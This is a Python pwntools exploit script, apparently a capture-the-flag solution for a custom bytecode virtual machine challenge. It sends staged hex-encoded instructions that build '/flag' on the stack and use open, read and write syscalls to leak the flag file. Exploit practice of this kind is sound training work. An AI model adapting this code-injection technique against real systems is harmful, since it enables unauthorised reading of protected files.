#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb='''
set disassembly-flavor intel
break open
#display/24g $rsp
display/8i $rip
display/x $rsi
c
'''

'''
mov = 0x10
add = 0x08
stk = 0x04
stm = 0x02
ldm = 0x80
cmp = 0x20
jmp = 0x01
sys = 0x40
    
0x404 rsp = 0x20
0x405 rip = 0x02
0x400   a = 0x40
0x401   b = 0x08
0x402   c = 0x01
0x403   d = 0x10
0x406   f = 0x04
'''

#[value][register][op]

def _compile():
    shellcode = ""
    shellcode += "004010" # mov a = 00
    shellcode += "ff0810" # mov b = ff
    shellcode += "ff0110" # mov c = ff
    shellcode += "401040" # read(0, code_base + 0x10, 255)
    size = int(len(shellcode))
    return bytes.fromhex(shellcode), size
   
def stage2(size):
    flag = ["2f", "66", "6c", "61", "67", "00"] # /flag\0
    print(str(size))
    shellcode = "00" * (int(size/2) + 1)
    for v in flag:
        shellcode += f"{v}4010" # mov byte into register
        shellcode += "400004"   # push onto stack
    #shellcode += "204080"       # stm *a = rsp 
    shellcode += "014010"       # mov a = 01

    shellcode += "000810"       # mov b (rsi) = 0x00
    shellcode += "402040"       # open(*rsp, O_RDONLY)
    shellcode += "200802"       # stm *b = rsp
    shellcode += "ff0110"       # mov c (rdx) = 0xff
    shellcode += "401040"       # read(fd, *buf, 255)
    shellcode += "014010"       # mov a = 01
    shellcode += "400840"       # write(01, *buf, 255)
    shellcode += "400140"       # exit()
    return bytes.fromhex(shellcode)

def runner():
    p = process()
    #p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])
    code, size = _compile()
    p.recv()
    p.send(code)
    print(p.recv().decode())
    p.send(stage2(size))
    #p.recv()
    print(p.recv().decode())
    print(p.recv().decode())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
